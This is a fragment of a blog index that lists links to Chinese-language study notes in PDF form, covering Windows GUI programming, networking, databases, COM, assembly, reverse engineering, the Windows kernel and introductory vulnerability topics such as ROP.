<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/%E5%90%91%E5%AF%BC%E9%A1%B5%E3%80%81tab%E6%8E%A7%E4%BB%B6%E3%80%81%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B6%88%E6%81%AF%E3%80%81%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95.pdf">向导页、tab控件、自定义消息、右键菜单</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/%E5%BA%8F%E5%88%97%E5%8C%96.pdf">序列化</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%81MFC.pdf">控件的使用、MFC</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/%E7%B1%BB%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F.pdf">类工厂模式</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/%E7%B1%BB%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E3%80%81%E7%94%BB%E7%AC%94%E7%94%BB%E5%88%B7.pdf">类工厂模式、画笔画刷</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/%E8%A7%86%E5%9B%BE%E5%88%86%E5%89%B2.pdf">视图分割</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/CAD%E7%9A%84%E7%BC%96%E5%86%99.pdf">CAD的编写</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/CAD%20%E2%80%94%20QT.pdf">CAD — QT</a></p>
<h3 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80.pdf">网络基础</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/MAC%E5%9C%B0%E5%9D%80%E3%80%81IP%E4%B8%8E%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81.pdf">MAC地址、IP与子网掩码</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/UDP%E5%92%8CTCP.pdf">UDP和TCP</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/HTTP.pdf">HTTP</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/socket%E5%A5%97%E6%8E%A5%E5%AD%97.pdf">socket套接字</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/socket%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B.pdf">socket网络模型</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E5%8E%9F%E5%A7%8B%E5%A5%97%E6%8E%A5%E5%AD%97%E3%80%81%E5%90%8C%E6%AD%A5%E4%B8%8E%E5%BC%82%E6%AD%A5.pdf">原始套接字、同步与异步</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E6%B1%A0%E6%8A%80%E6%9C%AF.pdf">池技术</a></p>
<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80.pdf">数据库基础</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL%E8%AF%AD%E6%B3%95.pdf">SQL语法</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E6%95%B0%E6%8D%AE%E5%BA%93/Sql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E3%80%81%E8%A7%A6%E5%8F%91%E5%99%A8%E3%80%81%E4%BA%8B%E5%8A%A1.pdf">Sql存储过程、触发器、事务</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93.pdf">关系数据库</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%20%E2%80%94%20%E8%8C%83%E5%BC%8F.pdf">数据库设计%20—%20范式</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/%E6%95%B0%E6%8D%AE%E5%BA%93/MySql%E6%8E%A5%E5%8F%A3.pdf">MySql接口</a></p>
<h3 id="COM组件"><a href="#COM组件" class="headerlink" title="COM组件"></a>COM组件</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/COM%E7%BB%84%E4%BB%B6/COM%E7%BB%86%E8%8A%82.pdf">COM细节</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/COM%E7%BB%84%E4%BB%B6/Plugin%E8%AE%BE%E8%AE%A1.pdf">Plugin设计</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/COM%E7%BB%84%E4%BB%B6/plugin%E7%9A%84%E8%AE%BE%E8%AE%A1.pdf">plugin的设计</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/COM%E7%BB%84%E4%BB%B6/%E7%AE%80%E6%98%93COM%E5%AE%9E%E7%8E%B0.pdf">简易COM实现</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/COM%E7%BB%84%E4%BB%B6/%E7%AE%80%E6%98%93COM%E5%AE%9E%E7%8E%B0%E6%94%B9%E8%BF%9B.pdf">简易COM实现改进</a></p>
<h3 id="MFC-amp-QT原理"><a href="#MFC-amp-QT原理" class="headerlink" title="MFC &amp; QT原理"></a>MFC &amp; QT原理</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/MFC%E5%8E%9F%E7%90%86/MFC%E5%8E%9F%E7%90%86.pdf">MFC原理</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/QT%E5%8E%9F%E7%90%86/Qt%20%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81.pdf">Qt 调试源码</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/QT%E5%8E%9F%E7%90%86/QT%E5%8E%9F%E7%90%86%20%E2%80%94%20%E4%BF%A1%E5%8F%B7%E6%A7%BD.pdf">QT原理 — 信号槽</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/QT%E5%8E%9F%E7%90%86/QT%20%E5%8E%9F%E7%90%861%20%E4%BF%A1%E5%8F%B7%E6%A7%BD%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AD%98%E5%82%A8.pdf">QT 原理1 信号槽信息的存储</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/QT%E5%8E%9F%E7%90%86/QT%20%E5%8E%9F%E7%90%862%20%E4%BF%A1%E5%8F%B7%E6%A7%BD%E7%9A%84%E8%BF%9E%E6%8E%A5.pdf">QT 原理2 信号槽的连接</a></p>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="PE结构"><a href="#PE结构" class="headerlink" title="PE结构"></a>PE结构</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/PE%E7%BB%93%E6%9E%84.pdf">PE结构</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/RVA%E4%B8%8EFOV%E7%9A%84%E8%BD%AC%E6%8D%A2.pdf">RVA与FOV的转换</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/%E5%AF%BC%E5%85%A5%E8%A1%A8.pdf">导入表</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/%E5%AF%BC%E5%87%BA%E8%A1%A8.pdf">导出表</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/%E6%89%8B%E5%B7%A5%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF.pdf">手工获取模块相关信息</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/%E6%B7%BB%E5%8A%A0%E8%8A%82.pdf">添加节</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/%E8%B5%84%E6%BA%90%E8%A1%A8.pdf">资源表</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.pdf">重定位表</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/TLS.pdf">TLS</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/inc2l%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90.pdf">inc2l程序分析</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3.pdf">ESP定律脱壳</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/PE/PEB%E5%92%8CTEB.pdf">PEB和TEB</a></p>
<h3 id="壳"><a href="#壳" class="headerlink" title="壳"></a>壳</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%A3%B3/%E5%A3%B3.pdf">壳</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%A3%B3/%E8%84%B1%E5%A3%B3%E5%AE%9E%E4%BE%8B.pdf">脱壳实例</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%A3%B3/VMP%E5%8E%9F%E7%90%86.pdf">VMP原理</a></p>
<h3 id="OD插件开发"><a href="#OD插件开发" class="headerlink" title="OD插件开发"></a>OD插件开发</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/OD%E6%8F%92%E4%BB%B6/OllyDbg%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8.pdf">OllyDbg插件开发入门</a></p>
<h3 id="调试器开发"><a href="#调试器开发" class="headerlink" title="调试器开发"></a>调试器开发</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E8%B0%83%E8%AF%95%E5%99%A8/%E8%B0%83%E8%AF%95%E5%99%A8%E6%A1%86%E6%9E%B6.pdf">调试器框架</a></p>
<h3 id="16bit-amp-32bit-汇编"><a href="#16bit-amp-32bit-汇编" class="headerlink" title="16bit &amp; 32bit 汇编"></a>16bit &amp; 32bit 汇编</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/8086%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F.pdf">8086寻址方式</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/8086%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4.pdf">8086常用指令</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/8086%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F.pdf">8086指令系统</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/16%E4%BD%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80.pdf">16位汇编基础</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/16%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E6%B3%95.pdf">16位汇编语法</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/32%E4%BD%8D%E6%B1%87%E7%BC%96.pdf">32位汇编</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/%E5%AD%90%E7%A8%8B%E5%BA%8F%E3%80%81%E4%B8%AD%E6%96%AD.pdf">子程序、中断</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/32%E6%B1%87%E7%BC%96%20%E2%80%94%20%E7%BB%93%E6%9E%84%E4%BD%93.pdf">32汇编 — 结构体</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/32%E6%B1%87%E7%BC%96%20%E2%80%94%20%E8%B0%83%E7%94%A8C%E5%BA%93%E5%87%BD%E6%95%B0%E4%B8%8E%E4%BD%BF%E7%94%A8%E8%B5%84%E6%BA%90.pdf">32汇编 — 调用C库函数与使用资源</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/32%E6%B1%87%E7%BC%96%20%E2%80%94%20SEH.pdf">32汇编 — SEH</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/32%E6%B1%87%E7%BC%96%20%E2%80%94%20%E6%B3%A8%E5%85%A5.pdf">32汇编 — 注入</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/32%E6%B1%87%E7%BC%96%20%E2%80%94%20%E7%AD%9B%E9%80%89%E5%99%A8%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86.pdf">32汇编 — 筛选器异常处理</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/tree/master/third/%E6%B1%87%E7%BC%96/%E5%BC%82%E5%B8%B8%E6%80%BB%E7%BB%93">异常总结</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/HookAPI.pdf">HookAPI</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/SetUnhandledExceptionFilter.pdf">SetUnhandledExceptionFilter</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%B1%87%E7%BC%96/%E4%BD%BF%E7%94%A8OD%E6%89%93%E8%A1%A5%E4%B8%81.pdf">使用OD打补丁</a></p>
<h3 id="x86逆向"><a href="#x86逆向" class="headerlink" title="x86逆向"></a>x86逆向</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97%EF%BC%9A%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4.pdf">x86逆向 - 基本运算：加减乘除</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97%EF%BC%9A%E5%8F%96%E6%A8%A1%E5%92%8C%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97.pdf">x86逆向 - 基本运算：取模和三目运算</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%B5%AE%E7%82%B9.pdf">x86逆向 - 字符串和浮点</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E6%95%B0%E7%BB%84.pdf">x86逆向 - 数组</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84.pdf">x86逆向 - 分支结构</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84.pdf">x86逆向 - 循环结构</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%87%BD%E6%95%B0%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F.pdf">x86逆向 - 函数和作用域</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E7%BB%93%E6%9E%84%E4%BD%93.pdf">x86逆向 - 结构体</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E6%9E%90%E6%9E%84%E6%9E%84%E9%80%A0%E4%B8%8E%E6%88%90%E5%91%98%E5%87%BD%E6%95%B0.pdf">x86逆向 - 析构构造与成员函数</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E8%99%9A%E5%87%BD%E6%95%B0.pdf">x86逆向 - 虚函数</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%AF%B9%E8%B1%A1%E4%BC%A0%E5%8F%82%E5%92%8C%E8%BF%94%E5%9B%9E.pdf">x86逆向 - 对象传参和返回</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%8D%95%E7%BB%A7%E6%89%BF.pdf">x86逆向 - 单继承</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF.pdf">x86逆向 - 多重继承</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x86%E9%80%86%E5%90%91/x86%E9%80%86%E5%90%91%20-%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86.pdf">x86逆向 - 异常处理</a></p>
<h3 id="x64汇编"><a href="#x64汇编" class="headerlink" title="x64汇编"></a>x64汇编</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x64%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91/x64%E6%B1%87%E7%BC%96%20-%20%E7%AE%80%E4%BB%8B.pdf">x64汇编 - 简介</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x64%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91/x64%E9%80%86%E5%90%91%20-%20%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F.pdf">x64逆向 - 调用约定和作用域</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x64%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91/x64%E9%80%86%E5%90%91%20-%20%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97%E5%92%8C%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84.pdf">x64逆向 - 基本运算和分支结构</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x64%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91/x64%E9%80%86%E5%90%91%20-%20%E7%B1%BB.pdf">x64逆向 - 类</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x64%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91/x64%E9%80%86%E5%90%91%20-%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86.pdf">x64逆向 - 异常处理</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/x64%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91/x64%E6%B1%87%E7%BC%96%20-%20%E5%A4%9A%E5%AA%92%E4%BD%93%E6%8C%87%E4%BB%A4%E9%9B%86.pdf">x64汇编 - 多媒体指令集</a></p>
<h3 id="Windows内核"><a href="#Windows内核" class="headerlink" title="Windows内核"></a>Windows内核</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%E7%AE%80%E4%BB%8B.pdf">内核简介</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E5%8A%A0%E8%BD%BD%E4%B8%8E%E8%B0%83%E8%AF%95.pdf">内核驱动加载与调试</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E9%A9%B1%E5%8A%A8%E6%A1%86%E6%9E%B6%E3%80%81%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E4%B8%8ER3%E9%80%9A%E4%BF%A1.pdf">驱动框架、内核驱动与R3通信</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%EF%BC%9A%E4%B8%AD%E6%96%AD%E5%BC%82%E5%B8%B8%E5%92%8C%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2.pdf">内核：中断异常和任务切换</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%EF%BC%9A%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%AE%BE%E8%AE%A1.pdf">内核：任务切换和系统调用设计</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%EF%BC%9A%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.pdf">内核：内存管理</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%EF%BC%9A%E7%B3%BB%E7%BB%9F%E5%9B%9E%E8%B0%83.pdf">内核：系统回调</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%EF%BC%9A%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8.pdf">内核：过滤驱动</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%EF%BC%9APsSetXxxNotifyRoutine.pdf">内核：PsSetXxxNotifyRoutine</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E5%86%85%E6%A0%B8/%E5%86%85%E6%A0%B8%EF%BC%9A%E6%94%BB%E9%98%B2%E7%9B%B8%E5%85%B3.pdf">内核：攻防相关</a></p>
<h3 id="漏洞入门"><a href="#漏洞入门" class="headerlink" title="漏洞入门"></a>漏洞入门</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%BC%8F%E6%B4%9E/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80.pdf">漏洞基础</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/third/%E6%BC%8F%E6%B4%9E/ROP.pdf">ROP</a></p>
]]></content>
      <categories>
        <category>过去</category>
      </categories>
      <tags>
        <tag>过去</tag>
      </tags>
  </entry>
</search>
